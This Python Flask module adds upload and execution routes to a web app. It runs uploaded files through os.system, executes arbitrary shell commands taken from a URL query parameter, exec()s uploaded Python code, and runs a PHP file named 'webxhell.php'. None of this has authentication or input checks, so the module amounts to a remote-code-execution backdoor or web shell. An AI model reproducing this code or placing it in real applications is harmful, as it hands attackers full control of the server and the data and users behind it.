from flask import Flask, request, redirect, url_for
import os
import subprocess

def fileupload(app, db):
    @app.route('/upload_form')
    def index():
        return '''
        <!doctype html>
        <title>Upload a file</title>
        <h1>Upload a file</h1>
        <form method=post enctype=multipart/form-data action="/upload">
        <input type=file name=file>
        <input type=submit value=Upload>
        </form>
        '''

    
    @app.route('/upload_file', methods=['POST'])
    def upload_file():
        if 'file' not in request.files:
            return redirect(request.url)
        file = request.files['file']
        if file.filename == '':
            return redirect(request.url)
        if file:
            filename = file.filename
            filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            file.save(filepath)
            
            os.system(f'python {filepath}')
            
            return 'File uploaded and executed.'
        
    
    @app.route('/execute', methods=['GET'])
    def execute_file():
        filename = request.args.get('filename')
        if not filename:
            return 'No filename provided.', 400
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        if not os.path.exists(filepath):
            return 'File does not exist.', 404
        # Execute the Python file using subprocess
        result = subprocess.run(['python3', filepath], capture_output=True, text=True)
        return f'Output: {result.stdout}<br>Error: {result.stderr}'
    
    @app.route('/execute-python', methods=['GET'])
    def execute_python():
        # Get the command from the query parameters in the URL
        command = request.args.get('command')
        
        # Check if command is provided
        if not command:
            return 'No command provided.', 400

        # Execute the command using subprocess
        result = subprocess.run(command.split(), capture_output=True, text=True)
        
        # Prepare the response
        response = {
            'output': result.stdout,
            'error': result.stderr
        }

        return response
    
    @app.route('/execute-php')
    def execute_php():
        # Specify the path to your PHP file
        php_file_path = 'uploads/webxhell.php'
        
        # Execute the PHP file using subprocess
        result = subprocess.run(['php', php_file_path], capture_output=True, text=True)
        
        # Return the output of PHP execution
        return result.stdout
    
    @app.route('/execute-uploads')
    def execute_python_file():
        # Get the filename from the query parameter
        filename = request.args.get('filename')
        if not filename:
            return 'No filename provided.', 400

        # Specify the directory where Python files are located
        directory = 'uploads'  # Update this with your directory path

        # Construct the full path to the Python file
        filepath = os.path.join(directory, filename)

        # Check if the file exists
        if not os.path.exists(filepath):
            return 'File does not exist.', 404

        # Read the content of the Python file
        with open(filepath, 'r') as file:
            python_code = file.read()

        # Execute the Python code
        try:
            exec(python_code)
            return 'Python script executed successfully.'
        except Exception as e:
            return f'Error executing Python script: {e}', 500